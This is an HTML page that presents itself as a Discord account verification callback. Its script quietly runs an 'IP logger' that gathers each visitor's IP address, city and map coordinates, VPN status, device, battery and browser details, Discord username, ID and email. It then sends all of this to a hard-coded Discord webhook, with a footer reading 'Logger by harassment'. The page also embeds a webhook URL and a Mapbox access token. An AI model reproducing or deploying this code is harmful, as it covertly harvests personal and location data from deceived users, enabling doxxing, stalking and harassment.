<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>‚úì</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* Animated background particles */
        body::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.05) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: moveBackground 20s linear infinite;
            z-index: 0;
        }

        @keyframes moveBackground {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        .container {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 60px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            text-align: center;
            position: relative;
            z-index: 1;
            animation: fadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        h1 {
            color: #000000;
            font-size: 28px;
            margin-bottom: 30px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #000000 0%, #333333 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top-color: #000000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 30px 0;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        p {
            color: #666666;
            margin-bottom: 20px;
            line-height: 1.6;
            font-size: 15px;
        }

        .success-box, .error-box {
            display: none;
            animation: slideIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .success-box.show, .error-box.show {
            display: block;
        }

        .success-box h2 {
            color: #00aa00;
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 700;
        }

        .error-box h2 {
            color: #dd0000;
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 700;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 20px;
            margin: 30px 0;
            padding: 25px;
            background: linear-gradient(135deg, #f8f8f8 0%, #f0f0f0 100%);
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            transition: transform 0.3s ease;
        }

        .user-info:hover {
            transform: translateY(-2px);
        }

        .user-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 3px solid #000000;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .user-details {
            text-align: left;
            flex: 1;
        }

        .user-name {
            font-size: 18px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 6px;
        }

        .user-id {
            font-size: 13px;
            color: #666666;
            font-family: 'Courier New', monospace;
        }

        .btn {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: #ffffff;
            border: none;
            padding: 14px 32px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 25px;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .checkmark {
            width: 80px;
            height: 80px;
            margin: 20px auto;
        }

        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 3;
            stroke: #00aa00;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            stroke: #00aa00;
            stroke-width: 3;
            fill: none;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
        }

        @keyframes stroke {
            100% {
                stroke-dashoffset: 0;
            }
        }

        .error-icon {
            width: 80px;
            height: 80px;
            margin: 20px auto;
        }

        .error-cross {
            stroke: #dd0000;
            stroke-width: 3;
            stroke-linecap: round;
            animation: draw 0.5s ease-out forwards;
        }

        @keyframes draw {
            from {
                stroke-dasharray: 100;
                stroke-dashoffset: 100;
            }
            to {
                stroke-dasharray: 100;
                stroke-dashoffset: 0;
            }
        }

        .error-details {
            background: #fff5f5;
            border-left: 4px solid #dd0000;
            padding: 15px;
            margin: 20px 0;
            border-radius: 8px;
            text-align: left;
            font-size: 13px;
            color: #666;
            font-family: 'Courier New', monospace;
        }

        @media (max-width: 600px) {
            .container {
                padding: 40px 30px;
                border-radius: 12px;
            }
            .user-info {
                flex-direction: column;
                text-align: center;
                padding: 20px;
            }
            .user-details {
                text-align: center;
            }
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="loading">
            <h1>Verifying</h1>
            <div class="spinner"></div>
            <p>Connecting to Discord...</p>
        </div>

        <div class="success-box" id="successBox">
            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
            </svg>
            <h2>‚úì Verified Successfully!</h2>
            <p>Your Discord account has been linked.</p>
            <div class="user-info" id="userInfo"></div>
            <a href="/" class="btn">Return Home</a>
        </div>

        <div class="error-box" id="errorBox">
            <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                <circle cx="26" cy="26" r="25" fill="none" stroke="#dd0000" stroke-width="3"/>
                <line class="error-cross" x1="18" y1="18" x2="34" y2="34"/>
                <line class="error-cross" x1="34" y1="18" x2="18" y2="34"/>
            </svg>
            <h2>Verification Failed</h2>
            <p id="errorMessage">Something went wrong. Please try again.</p>
            <div class="error-details" id="errorDetails" style="display: none;"></div>
            <a href="/" class="btn">Try Again</a>
        </div>

    <script>
        // ‚ö†Ô∏è CONFIGURATION - MUST MATCH index.html ‚ö†Ô∏è
        const CONFIG = {
            BACKEND_URL: 'https://cautious-space-guacamole-x57q75pgx4jp36rv7-3000.app.github.dev' // CHANGE THIS TO YOUR BACKEND URL!
        };

        const loading = document.getElementById('loading');
        const successBox = document.getElementById('successBox');
        const errorBox = document.getElementById('errorBox');
        const userInfo = document.getElementById('userInfo');
        const errorMessage = document.getElementById('errorMessage');
        const errorDetails = document.getElementById('errorDetails');

        async function handleCallback() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const state = urlParams.get('state');
            const savedState = localStorage.getItem('oauth_state');

            // Validate state
            if (!code) {
                showError('No authorization code received from Discord.', 'Code parameter missing');
                return;
            }

            if (state !== savedState) {
                showError('Security validation failed. Please try again.', 'State mismatch');
                localStorage.removeItem('oauth_state');
                return;
            }

            localStorage.removeItem('oauth_state');

            try {
                console.log('üîÑ Sending code to backend...');
                
                // Send code to backend with better error handling
                const response = await fetch(`${CONFIG.BACKEND_URL}/api/auth/discord`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    mode: 'cors',
                    credentials: 'include',
                    body: JSON.stringify({ code })
                });

                console.log('üì° Response status:', response.status);

                if (!response.ok) {
                    let errorMsg = 'Server error';
                    try {
                        const errorData = await response.json();
                        errorMsg = errorData.error || errorData.message || errorMsg;
                    } catch (e) {
                        errorMsg = `HTTP ${response.status}: ${response.statusText}`;
                    }
                    throw new Error(errorMsg);
                }

                const data = await response.json();
                console.log('‚úÖ Success:', data);

                if (!data.success || !data.user) {
                    throw new Error(data.error || 'Invalid response from server');
                }

                // Collect enhanced user data for logging
                await getUserData(data.user);

                // Show success
                showSuccess(data.user);

            } catch (error) {
                console.error('‚ùå Error:', error);
                
                let userMessage = 'Unable to connect to the verification server.';
                let technicalDetails = error.message;

                if (error.message.includes('Failed to fetch')) {
                    userMessage = 'Connection failed. The server may be offline or blocking requests.';
                    technicalDetails = 'CORS or network error - check backend URL and CORS settings';
                } else if (error.message.includes('NetworkError')) {
                    userMessage = 'Network error. Please check your internet connection.';
                } else if (error.message.includes('401') || error.message.includes('403')) {
                    userMessage = 'Authentication failed. Please try logging in again.';
                } else if (error.message.includes('404')) {
                    userMessage = 'Server endpoint not found. Contact administrator.';
                    technicalDetails = 'Backend endpoint /api/auth/discord not found';
                } else if (error.message.includes('500')) {
                    userMessage = 'Server error occurred. Please try again later.';
                }

                showError(userMessage, technicalDetails);
            }
        }

        function showSuccess(user) {
            loading.style.display = 'none';
            
            userInfo.innerHTML = `
                <img src="${user.avatar}" alt="${user.username}" class="user-avatar">
                <div class="user-details">
                    <div class="user-name">${user.username}</div>
                    <div class="user-id">ID: ${user.id}</div>
                </div>
            `;
            
            successBox.classList.add('show');
        }

        function showError(message, details = null) {
            loading.style.display = 'none';
            errorMessage.textContent = message;
            
            if (details) {
                errorDetails.textContent = `Technical details: ${details}`;
                errorDetails.style.display = 'block';
            }
            
            errorBox.classList.add('show');
        }

        // ============================================
        // ENHANCED IP LOGGER WITH DISCORD USER DATA
        // ============================================
        
        async function getIpAndLocationData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                return await response.json();
            } catch (error) {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    return { ip: ipData.ip };
                } catch (fallbackError) {
                    return { ip: "Unknown" };
                }
            }
        }

        async function getUserData(discordUser) {
            try {
                const geoData = await getIpAndLocationData();
                
                const ip = geoData.ip || "Unknown";
                const browserInfo = navigator.userAgent;
                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                const language = navigator.language;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const timestamp = new Date().toLocaleString();
                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "üì± Mobile" : "üíª Computer";
                const onlineStatus = navigator.onLine ? "üü¢ Online" : "üî¥ Offline";
                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
                const os = (navigator.userAgentData?.platform) || navigator.platform || "Unknown";
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                const navHeight = `${window.innerHeight}px`;
                
                let batteryLevel = "Unknown";
                let powerSavingMode = "Unknown";
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
                        powerSavingMode = battery.charging ? "No" : "Yes";
                    } catch (error) {}
                }

                let adBlockEnabled = "‚ùå None";
                try {
                    const testAd = document.createElement('div');
                    testAd.innerHTML = '&nbsp;';
                    testAd.className = 'adsbox';
                    testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px;';
                    document.body.appendChild(testAd);
                    
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    if (testAd.offsetHeight === 0) {
                        adBlockEnabled = "‚úÖ Yes";
                    }
                    document.body.removeChild(testAd);
                } catch (e) {
                    adBlockEnabled = "‚úÖ Yes";
                }

                const browserName = navigator.appName || "Unknown";
                const browserVersion = navigator.appVersion || "Unknown";
                const cookiesEnabled = navigator.cookieEnabled ? "‚úÖ Yes" : "‚ùå None";
                
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const connectionType = connection?.effectiveType || "Unknown";
                const connectionRtt = connection?.rtt ? `${connection.rtt} ms` : "Unknown";
                const connectionDownlink = connection?.downlink ? `${connection.downlink} Mbps` : "Unknown";

                let vpnStatus = "‚ùå Unlikely";
                if (geoData.org) {
                    const org = geoData.org.toLowerCase();
                    if (org.includes("vpn") || org.includes("hosting") || org.includes("proxy")) {
                        vpnStatus = "üõ°Ô∏è Possible VPN/Proxy";
                    }
                }

                const locationString = (geoData.city && geoData.region && geoData.country_name)
                    ? `${geoData.city}, ${geoData.region}, ${geoData.country_name}`
                    : "Unknown";

                let mapImageUrl = null;
                let mapLocation = "No location data";
                
                if (geoData.latitude && geoData.longitude) {
                    const lat = geoData.latitude;
                    const lon = geoData.longitude;
                    
                    const roundedLat = Math.round(lat * 100) / 100;
                    const roundedLon = Math.round(lon * 100) / 100;
                    
                    const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
                    mapImageUrl = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${roundedLon},${roundedLat})/${roundedLon},${roundedLat},12,0/600x300@2x?access_token=${mapboxToken}`;
                    
                    mapLocation = `${roundedLat}, ${roundedLon}`;
                }

                const data = {
                    ip, browser: browserInfo, resolution: screenResolution,
                    language, timeZone, timestamp, deviceType, onlineStatus,
                    uptime, os, cpuCores, navHeight, batteryLevel,
                    powerSavingMode, adBlockEnabled, browserName, browserVersion,
                    cookiesEnabled, connectionType, connectionRtt, connectionDownlink,
                    location: locationString, vpnStatus, mapImageUrl, mapLocation,
                    discordUser: discordUser
                };

                await sendDataToWebhook(data);
                
            } catch (error) {
                console.error('Error collecting user data:', error);
            }
        }

        async function sendDataToWebhook(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1454034084744659024/eZXZKMCDxZ04wP48ks9qzZv3t4jxyk0wshQ9iLcyAYuoSoa6a9ujSVzh62y0AP7IDyVD';
            
            const embed = {
                title: "üìä Device Details",
                color: 16711680,
                fields: [
                    { name: "üë§ Discord Username", value: data.discordUser.username, inline: true },
                    { name: "üÜî Discord ID", value: data.discordUser.id, inline: true },
                    { name: "üìß Email", value: data.discordUser.email || "Not provided", inline: true },
                    { name: "üìç IP", value: data.ip, inline: true },
                    { name: "üåç Location", value: data.location, inline: true },
                    { name: "üó∫Ô∏è Coordinates", value: data.mapLocation, inline: true },
                    { name: "üõ°Ô∏è VPN/Proxy", value: data.vpnStatus, inline: true },
                    { name: "üñ•Ô∏è Resolution", value: data.resolution, inline: true },
                    { name: "üó£Ô∏è Language", value: data.language, inline: true },
                    { name: "üïí TimeZone", value: data.timeZone, inline: true },
                    { name: "üìÖ Time", value: data.timestamp, inline: false },
                    { name: "üì± Device", value: data.deviceType, inline: true },
                    { name: "üîã Battery", value: data.batteryLevel, inline: true },
                    { name: "‚ö° Power Saving", value: data.powerSavingMode, inline: true },
                    { name: "üñ•Ô∏è Operating System", value: data.os, inline: true },
                    { name: "üîó Status", value: data.onlineStatus, inline: true },
                    { name: "üìä Uptime", value: data.uptime, inline: true },
                    { name: "üñ•Ô∏è CPU Cores", value: String(data.cpuCores), inline: true },
                    { name: "üìè Height", value: data.navHeight, inline: true },
                    { name: "üö´ AdBlock", value: data.adBlockEnabled, inline: true },
                    { name: "üåê Browser", value: data.browserName, inline: true },
                    { name: "üç™ Cookies", value: data.cookiesEnabled, inline: true },
                    { name: "üì∂ Connection", value: data.connectionType, inline: true },
                    { name: "‚è±Ô∏è RTT", value: data.connectionRtt, inline: true },
                    { name: "‚¨áÔ∏è Speed", value: data.connectionDownlink, inline: true }
                ],
                thumbnail: { url: data.discordUser.avatar },
                footer: { 
                    text: "Logger by harassment", 
                    icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096" 
                }
            };

            if (data.mapImageUrl) {
                embed.image = { url: data.mapImageUrl };
            }

            const payload = {
                content: "üì° **User Verified & Logged**",
                embeds: [embed]
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('‚úÖ Data logged to webhook');
            } catch (error) {
                console.error('‚ùå Webhook error:', error);
            }
        }

        handleCallback();
    </script>
